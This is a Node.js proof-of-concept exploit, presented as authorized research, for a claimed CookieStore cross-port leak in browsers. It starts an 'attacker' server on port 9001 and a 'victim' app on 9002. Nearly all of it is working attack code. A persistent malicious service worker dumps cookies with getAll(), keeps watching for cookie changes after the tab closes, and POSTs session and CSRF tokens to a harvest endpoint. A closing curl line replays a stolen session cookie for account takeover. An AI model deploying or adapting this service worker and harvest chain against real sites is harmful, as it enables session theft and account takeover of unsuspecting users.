#!/usr/bin/env node
// chain3_persistent_harvest.js
// CookieStore Cross-Port Leak — Chain 3 Full PoC
// SW Persistent Backdoor -> Time-Delayed Session Harvest -> ATO
//
// sn0x | Authorized security research | 2026-06-29
//
// WHAT THIS DEMONSTRATES:
//   Port 9001 = "attacker-controlled" service on shared hostname
//   Port 9002 = "victim's" production app on shared hostname
//
//   Step 1: Victim visits http://localhost:9001/ (attacker service)
//           -> SW registered at :9001
//           -> getAll() immediately captures existing :9002 cookies
//   Step 2: Later (even if :9001 tab is closed), victim logs into http://localhost:9002/
//           -> cookiechange SW event fires at :9001 with stolen cookie value
//   Step 3: SW posts stolen value to /harvest endpoint (simulates exfil to attacker server)
//
// USAGE:
//   node chain3_persistent_harvest.js
//   Open: http://localhost:9001/  (victim visits attacker page once)
//   Then: http://localhost:9002/set  (victim logs into their app)
//   Check: http://localhost:9001/harvest  (see stolen cookies)
//
// CONFIRMED: Chrome 145, Firefox 146

"use strict";
const http   = require("node:http");
const crypto = require("node:crypto");

const ATTACKER_PORT = 9001;
const VICTIM_PORT   = 9002;
const HOST          = "localhost";
const ATTACKER_ORIGIN = `http://${HOST}:${ATTACKER_PORT}`;
const VICTIM_ORIGIN   = `http://${HOST}:${VICTIM_PORT}`;

// In-memory harvest log — simulates attacker's collection server
const harvestLog = [];
let visitCount = 0;

function ts() { return new Date().toISOString().slice(11, 23); }
function log(m) { process.stdout.write(`[${ts()}] ${m}\n`); }

// ─── MALICIOUS SERVICE WORKER ────────────────────────────────────────────────
// This SW is served at http://localhost:9001/sw-harvest.js
// It does three things:
//   1. On activate: calls getAll() to dump existing cross-port cookies (passive read)
//   2. On cookiechange: captures any new cookies set on the hostname (persistent monitor)
//   3. All results POSTed to /harvest on the attacker server
const SW_CODE = `
// Malicious SW at http://localhost:${ATTACKER_PORT}/
// Harvests cookies from http://localhost:${VICTIM_PORT}/ (different origin, same host)

const HARVEST_URL = '${ATTACKER_ORIGIN}/harvest';

self.addEventListener('install',  () => self.skipWaiting());
self.addEventListener('activate', (event) => event.waitUntil((async () => {
    await clients.claim();

    // REQUIRED for the SW 'cookiechange' event (Vector 2) to fire at all.
    // CookieStoreManager.subscribe() must be called or the handler is never invoked.
    try {
        await self.registration.cookies.subscribe([{ name: '' }]); // '' = all cookies at scope
    } catch (e) {
        console.error('[SW] cookies.subscribe error:', e);
    }

    // ATTACK VECTOR 1: Passive dump of ALL existing cross-port cookies
    // Runs immediately on SW activation — no events needed
    // Captures cookies set by :${VICTIM_PORT} BEFORE victim visited this page
    try {
        const allCookies = await cookieStore.getAll();
        const stolen = allCookies.map(c => ({
            name: c.name,
            value: c.value,
            domain: c.domain,
            path: c.path,
            secure: c.secure,
            sameSite: c.sameSite,
            expires: c.expires,
        }));

        if (stolen.length > 0) {
            await fetch(HARVEST_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    vector: 'getAll-passive',
                    timing: 'on-activation',
                    count: stolen.length,
                    cookies: stolen,
                    ts: new Date().toISOString(),
                }),
            });
        }
    } catch(e) {
        console.error('[SW] getAll() error:', e);
    }
})()));

// ATTACK VECTOR 2: Real-time monitoring via cookiechange events
// Persists indefinitely — fires even when attacker page is closed
// Captures ALL future logins/logouts on :${VICTIM_PORT}
self.addEventListener('cookiechange', async (event) => {
    const changed = (event.changed || []).map(c => ({
        name: c.name,
        value: c.value,    // Full plaintext value
        domain: c.domain,
        path: c.path,
        secure: c.secure,
        sameSite: c.sameSite,
        httpOnly: c.httpOnly,  // Will be false; HttpOnly cookies are correctly filtered
        expires: c.expires,
    }));

    const deleted = (event.deleted || []).map(c => ({
        name: c.name,
        domain: c.domain,
        path: c.path,
    }));

    if (changed.length === 0 && deleted.length === 0) return;

    await fetch(HARVEST_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            vector: 'cookiechange-event',
            timing: 'persistent-monitor',
            changed,
            deleted,
            ts: new Date().toISOString(),
        }),
    });
});
`;

// ─── ATTACKER PAGE ────────────────────────────────────────────────────────────
// Served at http://localhost:9001/
// Registers malicious SW on victim's first visit
// Shows real-time harvest feed (for demo purposes)
const ATTACKER_PAGE = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Shared Service - localhost:${ATTACKER_PORT}</title>
<style>
body { font-family: monospace; background: #1a1a1a; color: #00ff41; padding: 20px; }
h1 { color: #ff4141; }
.status { padding: 10px; margin: 10px 0; border: 1px solid #333; }
.ok { color: #00ff41; }
.warn { color: #ffaa00; }
.stolen { color: #ff4141; font-weight: bold; }
pre { background: #111; padding: 10px; overflow-x: auto; }
button { background: #333; color: #fff; border: 1px solid #555; padding: 8px 16px; cursor: pointer; margin: 4px; }
</style>
</head>
<body>
<h1>Service on Port ${ATTACKER_PORT}</h1>
<p>This page is running at <strong>http://localhost:${ATTACKER_PORT}/</strong></p>
<div id="sw-status" class="status warn">Registering service worker...</div>
<div id="getall-result" class="status" style="display:none"></div>
<hr>
<h2>Harvest Log (cookies stolen from localhost:${VICTIM_PORT})</h2>
<div id="log">Waiting for stolen cookies...</div>
<hr>
<h2>Manual Test</h2>
<button onclick="doGetAll()">Run getAll() Now</button>
<button onclick="pollHarvest()">Refresh Harvest Log</button>
<hr>
<h2>Scenario Walkthrough</h2>
<ol>
<li>This page registers a Service Worker (done on load)</li>
<li>The SW calls cookieStore.getAll() and also listens for cookiechange events</li>
<li>Open <a href="${VICTIM_ORIGIN}/set" target="_blank">localhost:${VICTIM_PORT}/set</a> to simulate victim login</li>
<li>Come back here and click "Refresh Harvest Log" to see stolen cookies</li>
<li><strong>Key:</strong> Even if you close THIS tab, the SW persists. Future logins to :${VICTIM_PORT} will be captured.</li>
</ol>

<script>
async function registerSW() {
    const statusEl = document.getElementById('sw-status');
    try {
        const reg = await navigator.serviceWorker.register('/sw-harvest.js', {
            scope: '/'
        });
        statusEl.className = 'status ok';
        statusEl.textContent = 'SW registered: ' + reg.scope + ' (state: ' + (reg.active ? 'active' : reg.installing ? 'installing' : 'waiting') + ')';

        // Also activate immediately
        if (reg.installing) {
            reg.installing.addEventListener('statechange', (e) => {
                if (e.target.state === 'activated') {
                    statusEl.textContent = 'SW registered and ACTIVE: ' + reg.scope;
                }
            });
        }

        // Register document-level listener too (Vector A - no SW required)
        cookieStore.addEventListener('change', (event) => {
            const changes = event.changed.map(c => c.name + '=' + c.value).join(', ');
            const logEl = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = 'stolen';
            entry.textContent = '[VECTOR-A DOCUMENT] ' + new Date().toISOString() + ': ' + changes;
            logEl.prepend(entry);

            // Also POST to harvest
            fetch('/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    vector: 'document-addEventListener',
                    changed: event.changed.map(c => ({name:c.name, value:c.value, domain:c.domain})),
                    ts: new Date().toISOString(),
                })
            });
        });

    } catch(e) {
        statusEl.className = 'status warn';
        statusEl.textContent = 'SW registration failed: ' + e.message;
    }
}

async function doGetAll() {
    const el = document.getElementById('getall-result');
    el.style.display = 'block';
    try {
        const cookies = await cookieStore.getAll();
        el.innerHTML = '<strong>cookieStore.getAll() at localhost:${ATTACKER_PORT}:</strong><pre>' +
            JSON.stringify(cookies, null, 2) + '</pre>';

        const crossPort = cookies.filter(c => c.name.startsWith('victim_') || c.name.includes('session') || c.name.includes('token'));
        if (crossPort.length > 0) {
            el.innerHTML += '<div class="stolen">CROSS-PORT COOKIES DETECTED: ' + crossPort.map(c=>c.name+'='+c.value).join(', ') + '</div>';
        }
    } catch(e) {
        el.textContent = 'getAll() error: ' + e.message;
    }
}

async function pollHarvest() {
    const resp = await fetch('/harvest');
    const data = await resp.json();
    const logEl = document.getElementById('log');
    if (data.entries.length === 0) {
        logEl.textContent = 'No stolen cookies yet. Visit localhost:${VICTIM_PORT}/set first.';
        return;
    }
    logEl.innerHTML = data.entries.map(e => {
        const cookies = (e.cookies || []).concat(e.changed || []).map(c =>
            '<span class="stolen">' + c.name + ' = ' + c.value + '</span>'
        ).join(', ');
        return '<div class="status"><strong>' + e.vector + '</strong> @ ' + e.ts + '<br>' + cookies + '</div>';
    }).join('');
}

registerSW();
setInterval(pollHarvest, 2000);  // Auto-refresh every 2 seconds
</script>
</body>
</html>`;

// ─── VICTIM PAGE ─────────────────────────────────────────────────────────────
// Served at http://localhost:9002/set
// Simulates victim logging in (sets session cookie)
const VICTIM_SET_PAGE = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>My App - Login - localhost:${VICTIM_PORT}</title>
<style>
body { font-family: sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; }
.info { background: #e8f4fd; border: 1px solid #bee3f8; padding: 15px; border-radius: 4px; }
</style>
</head>
<body>
<h1>My Application (localhost:${VICTIM_PORT})</h1>
<div class="info">
<p>This page simulates victim login. It sets session cookies for localhost:${VICTIM_PORT}.</p>
<p><strong>These cookies should only be visible to localhost:${VICTIM_PORT}</strong></p>
<p>But due to the CookieStore cross-port bug, they are visible to localhost:${ATTACKER_PORT}.</p>
</div>
<p id="status">Setting cookies...</p>
<script>
async function setSessionCookies() {
    // Simulate: user logs in, server sets session cookie
    // In reality: server would set these via Set-Cookie header (HttpOnly)
    // For PoC: we set them via JS to demonstrate non-HttpOnly exposure

    const sessionToken = 'SESSION_' + Math.random().toString(36).substr(2, 16).toUpperCase();
    const csrfToken = 'CSRF_' + Math.random().toString(36).substr(2, 12).toUpperCase();

    await cookieStore.set({
        name: 'session',
        value: sessionToken,
        path: '/',
        // No HttpOnly (this is the non-HttpOnly session, e.g., from SPA auth)
        sameSite: 'lax',
    });

    await cookieStore.set({
        name: 'csrf_token',
        value: csrfToken,
        path: '/',
        sameSite: 'lax',
    });

    await cookieStore.set({
        name: 'victim_port_only',
        value: 'SECRET_SESSION_' + sessionToken,
        path: '/',
        sameSite: 'lax',
    });

    document.getElementById('status').innerHTML =
        '<strong>Cookies set for localhost:${VICTIM_PORT}:</strong><br>' +
        'session = ' + sessionToken + '<br>' +
        'csrf_token = ' + csrfToken + '<br><br>' +
        '<strong>Now go back to <a href="${ATTACKER_ORIGIN}">localhost:${ATTACKER_PORT}</a> and click Refresh Harvest Log</strong>';
}

setSessionCookies();
</script>
</body>
</html>`;

// ─── HTTP SERVERS ─────────────────────────────────────────────────────────────

// Attacker server on port 9001
const attackerServer = http.createServer((req, res) => {
    const url = new URL(req.url, ATTACKER_ORIGIN);

    // Serve the malicious SW
    if (url.pathname === '/sw-harvest.js') {
        res.writeHead(200, {
            'Content-Type': 'application/javascript',
            'Service-Worker-Allowed': '/',
        });
        res.end(SW_CODE);
        return;
    }

    // Harvest endpoint — receives stolen cookies from SW
    if (url.pathname === '/harvest') {
        if (req.method === 'POST') {
            let body = '';
            req.on('data', d => body += d);
            req.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    harvestLog.push(data);

                    log(`*** STOLEN COOKIES (vector=${data.vector}) ***`);
                    const cookies = (data.cookies || []).concat(data.changed || []);
                    for (const c of cookies) {
                        if (c.name !== 'attacker_own') {
                            log(`  ${c.name} = ${c.value} (from ${c.domain || 'localhost'})`);
                        }
                    }
                } catch(e) {
                    log('Harvest parse error: ' + e.message);
                }
                res.writeHead(204);
                res.end();
            });
        } else {
            // GET — return harvest log for display
            res.writeHead(200, {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': ATTACKER_ORIGIN,
            });
            res.end(JSON.stringify({ entries: harvestLog }));
        }
        return;
    }

    // Main attacker page
    res.writeHead(200, {
        'Content-Type': 'text/html',
        'Cache-Control': 'no-store',
    });
    res.end(ATTACKER_PAGE);
});

// Victim server on port 9002
const victimServer = http.createServer((req, res) => {
    // CORS: victim app does not allow attacker origin
    res.writeHead(200, {
        'Content-Type': 'text/html',
        'Cache-Control': 'no-store',
    });
    res.end(VICTIM_SET_PAGE);
});

// ─── MAIN ─────────────────────────────────────────────────────────────────────
attackerServer.listen(ATTACKER_PORT, HOST, () => {
    log(`Attacker server started: ${ATTACKER_ORIGIN}`);
    log(`  -> Main page (register malicious SW): ${ATTACKER_ORIGIN}/`);
    log(`  -> SW code:                           ${ATTACKER_ORIGIN}/sw-harvest.js`);
    log(`  -> Harvest log:                       ${ATTACKER_ORIGIN}/harvest`);
});

victimServer.listen(VICTIM_PORT, HOST, () => {
    log(`Victim server started:  ${VICTIM_ORIGIN}`);
    log(`  -> Set session cookies (simulate login): ${VICTIM_ORIGIN}/set`);
});

log('');
log('=== CHAIN 3 PoC: SW Persistent Backdoor -> Session Harvest -> ATO ===');
log('');
log('STEP 1: Open http://localhost:9001/ in Chrome or Firefox');
log('        -> SW registers, getAll() fires immediately');
log('        -> Any existing :9002 cookies are stolen on the spot');
log('');
log('STEP 2: Close the :9001 tab (SW persists in background)');
log('');
log('STEP 3: Open http://localhost:9002/set in new tab');
log('        -> Simulates victim logging into their app');
log('        -> Session cookies set for :9002');
log('');
log('STEP 4: Watch this console - stolen cookies will appear here');
log('        (SW cookiechange event fires even though :9001 tab is closed)');
log('');
log('STEP 5: Use stolen session token to access victim account:');
log('        curl -H "Cookie: session=STOLEN_VALUE" http://localhost:9002/api/me');
log('');
log('=== Press Ctrl+C to stop ===');
log('');

process.on('SIGINT', () => {
    log('\nStopping servers...');
    log(`Total cookies harvested: ${harvestLog.length}`);
    harvestLog.forEach((e, i) => {
        const cookies = (e.cookies || []).concat(e.changed || []);
        log(`  [${i+1}] ${e.vector}: ${cookies.map(c=>c.name+'='+c.value).join(', ')}`);
    });
    process.exit(0);
});
